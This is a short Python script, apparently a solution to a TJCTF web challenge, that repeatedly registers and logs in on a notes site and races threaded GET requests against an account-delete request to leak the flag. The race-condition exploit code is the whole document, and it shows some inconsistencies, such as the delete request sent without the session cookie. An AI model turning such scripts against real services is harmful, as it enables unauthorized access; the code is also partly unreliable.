import requests
import concurrent.futures

base = "https://notes-d4ccb98aa93ebbac.tjc.tf"

def check_flag(method,cookie):
    if method == "GET":
        r = requests.get(url=base,cookies=cookie,verify=False,allow_redirects=True)
    elif method == "POST":
        r =requests.post(url=base+'/user/delete',data={"password":"pogman"},verify=True,allow_redirects=True)
    if "tjctf" in r.text:
        print(r.text)
        exit(0)

while True:
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []

        r =requests.post(base+"/register",data={"username":"pogman","password":"pogman"},allow_redirects=True)
        print(r.cookies)
        r = requests.post(base+"/login",data={"username":"pogman","password":"pogman"},allow_redirects=True)

        futures.append(executor.submit(check_flag,method="GET",cookie=r.cookies))
        futures.append(executor.submit(check_flag,method="GET",cookie=r.cookies))
        futures.append(executor.submit(check_flag,method="GET",cookie=r.cookies))
        futures.append(executor.submit(check_flag,method="GET",cookie=r.cookies))
        futures.append(executor.submit(check_flag,method="POST",cookie=r.cookies))
        futures.append(executor.submit(check_flag,method="GET",cookie=r.cookies))
        futures.append(executor.submit(check_flag,method="GET",cookie=r.cookies))
        futures.append(executor.submit(check_flag,method="GET",cookie=r.cookies))
        futures.append(executor.submit(check_flag,method="GET",cookie=r.cookies))
        for future in concurrent.futures.as_completed(futures):
            print(future.result())

# Their docker container ain't building for me 
#  To Do: Find out what the script does


